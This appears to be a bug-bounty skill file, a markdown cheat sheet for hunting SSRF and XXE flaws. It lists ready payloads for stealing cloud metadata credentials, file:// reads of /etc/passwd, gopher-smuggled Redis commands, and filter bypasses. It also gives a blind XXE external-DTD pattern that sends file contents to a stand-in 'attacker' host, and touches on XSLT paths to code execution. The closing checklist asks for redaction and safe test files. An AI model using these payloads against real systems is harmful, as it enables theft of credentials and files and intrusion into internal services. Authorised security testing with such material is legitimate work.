---
name: hunt-ssrf-xxe
description: >-
  Hunt for SSRF and XXE — internal network reach, cloud metadata theft, blind OOB
  confirmation, gopher/phar-style protocol abuse, file-read via XXE, error-based exfil.
  Built from personal notes. Use when apps fetch URLs, parse XML, accept file uploads with
  XML formats, or sit behind proxies/CDNs.
mitre_attack: [T1190, T1552]
---

# SSRF & XXE (from your notes + advanced)

> See also (project skills): `hunt-ssrf` (15-report SSRF deep dive). This skill is the combined SSRF + XXE umbrella with the protocol/bypass detail; `hunt-ssrf` owns the report-driven taxonomy.

## SSRF (your notes)

**Recon — where:** params `url uri link target dest callback webhook redirect return next api_url`; headers (`Referer` #1, `X-Forwarded-For`, `Origin`); features: link preview, avatar-from-URL, PDF/screenshot renderers, webhook registration, "test connection", RSS importers.

**Detection flow:**
1. `?p=https://google.com` (parameter works?)
2. `?p=http://127.0.0.1` / `localhost` / `0.0.0.0`
3. Cloud metadata `169.254.169.254/latest/meta-data/`
4. **Blind:** Collaborator/interact.sh — DNS hit = resolving; HTTP hit = confirmed SSRF
5. Time-based: open port ≈ fast, closed ≈ instant-refuse/timeout — build a port map
6. Intruder-scan `192.168.0.§1§` ranges on interesting ports

**Payloads (your set):**
- Localhost: `127.1`, `127.0.0.1.nip.io`, `localtest.me`, `spoofed.burpcollaborator.net`
- Metadata: AWS `/latest/meta-data/iam/security-credentials/[ROLE]`, `/user-data`, instance-identity document; GCP `metadata.google.internal` (+ `Metadata-Flavor: Google` header); Azure IMDS `?api-version=...`
- Protocols: `file:///etc/passwd`, `file:///C:/Windows/win.ini`, `gopher://127.0.0.1:6379/_INFO`, `dict://`, `ldap://`, `tftp://`, `sftp://`
- File-based: XXE-in-SVG, `<iframe src>` HTML upload, `.m3u` playlist, foreignObject SVG
- Request line: `GET @169.254.169.254`, `;@host` (Spring), absolute URL with foreign Host

**Bypass ladder (your notes):** shortened/decimal/hex/octal IPs (`2130706433`, `0x7f000001`, `0177.0.0.1`), IPv6 `[::1]`/`[::ffff:127.0.0.1]`, `allowed.com@evil.com`, `#`, `allowed.com.evil.com`, encoding, **open-redirect chains**, parser differentials (`http:127.0.0.1/`, backslash mixes).

**Escalation mindset (your notes):** confirm → scan what server reaches → find sensitive services (Redis, metadata, admin) → extract data → chain bugs. Common mistakes: testing only `http://`, assuming silence = safe (blind!), forgetting headers/uploads, not trying bypasses, only port 80.

## XXE (your notes)

**Surfaces:** `application/xml`/`text/xml` endpoints, SOAP, **try JSON→XML content-type switch**, uploads (.svg, .docx/.xlsx/.pptx, .odt, RSS), URL importers, PDF generators.

**Detect:** basic `&xxe;` echo → file read (`file:///etc/passwd`, `/etc/hostname`, `win.ini`) → `php://filter/convert.base64-encode` → **blind**: `%xxe;` parameter entity + Collaborator → fingerprint tech via error strings (simplexml=PHP, XmlDocument=.NET, SAXParser=Java).

**Blind exfil pattern (your notes):**
```xml
<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % dtd SYSTEM "http://attacker/evil.dtd"> %dtd;]>
```
with `evil.dtd`: `<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker/?data=%file;'>"> %all; %send;`
DNS variant for when HTTP is filtered. FTP for large files.

**Error-based (no external connection):** local DTD redefinition — load `/usr/share/yelp/dtd/docbookx.dtd` (or fonts.dtd / Windows cim20.dtd), redefine an entity to concatenate file content into `file:///no/%file;` → error message leaks data.

**Uploads:** SVG `<text>&xxe;</text>`; DOCX edit `word/document.xml`; XLSX `xl/sharedStrings.xml`; SOAP with CDATA trick.

**Bypasses (your notes):** `PUBLIC` instead of `SYSTEM`; numeric charrefs (`file&#x3a;&#x2f;...`); CDATA-break via external DTD; weird tag names (`<!DOCTYPE:. SYSTEM ...>`); hex-encoded quotes.

**Tools:** Burp + Collaborator (essential), XXEinjector, dtd-finder (local DTD discovery), oxml_xxe, Interactsh, xxeftp for FTP exfil.

## 🚀 Advanced (beyond your notes)

- **IMDSv2 (AWS):** newer instances require `PUT` + token header — chain through request-smuggling/302-capable fetchers or gopher to issue the PUT; always try v2 first, fall back to v1.
- **GCP/Azure nuances:** GCP needs `Metadata-Flavor: Google` header (test header injection into the backend fetcher); Azure managed identity returns `secret` header — IMDS answers on `169.254.169.254` too but with `Metadata: true` required.
- **DNS rebinding for metadata:** first response = attacker IP (serves page), TTL=0 flip → second resolution = `169.254.169.254`; the page then fetches metadata same-origin.
- **Gopher smuggling:** full TCP over `gopher://` — Redis inline commands (`gopher://127.0.0.1:6379/_CONFIG SET dir ...`), Memcached, SMTP, MySQL handshake abuse; URL-encode carefully (`%0d%0a`).
- **Blind SSRF via renderers:** PDF/screenshot generators fetch not only your URL but follow `<img>`/CSS inside → exfil-token in the rendered artifact, or hit internal hosts from the renderer's network position.
- **XXE — file-size escalation:** exfil multi-MB files via FTP chunks or repeated DNS labels; `%file;` inside attribute vs text contexts changes encoding needs.
- **XXE in XSLT stylesheets:** if the app accepts `xsl`, `document()` + extension elements (`exsl:node-set`, Saxon `saxon:eval`) widen impact to code execution on Java stacks.
- **Parameter-entity depth limits:** some parsers cap nesting — bypass by flattening chains across multiple external DTDs or using `SYSTEM` entities pointing at your DTD with staged definitions.
- **Request smuggling → SSRF/XXE amplifier:** smuggled internal requests can reach parser paths the front-end blocks (SOAP on internal vhosts, XML admin endpoints).

## Validation checklist
- [ ] SSRF: OOB hit + at least one piece of internal data (metadata creds/internal page) — not just an error delta
- [ ] Internal keys redacted to first/last 4 chars in the report
- [ ] XXE: file content retrieved, blind variant confirmed via your channel
- [ ] Cloud metadata: note IMDSv1 vs v2 and defense (egress filtering, IMDSv2 required)
- [ ] PoC uses safe files (/etc/hostname) — no mass dumping